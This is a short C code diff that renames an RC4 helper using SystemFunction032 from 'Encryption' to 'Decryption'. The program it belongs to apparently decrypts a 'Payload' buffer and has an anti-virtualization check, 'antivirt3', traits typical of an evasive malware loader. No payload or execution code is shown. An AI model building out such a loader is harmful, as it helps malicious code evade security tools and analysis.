@@ -18,7 +18,7 @@ int main(void)
 
 	printf("[*] Decrypting data...\n");
 	// Pass in the data to out helper function
-	if (!Rc4EncryptionViaSystemFunc032(Rc4Key, Payload, KeySize, PayloadSize)) {
+	if (!Rc4DecryptionViaSystemFunc032(Rc4Key, Payload, KeySize, PayloadSize)) {
 		printf("[!] Decryption failed.\n");
 	}
 	
@@ -168,7 +168,7 @@ BOOL antivirt3(void)
 	return TRUE;
 }
 
-BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
+BOOL Rc4DecryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {
 
 	typedef struct
 	{
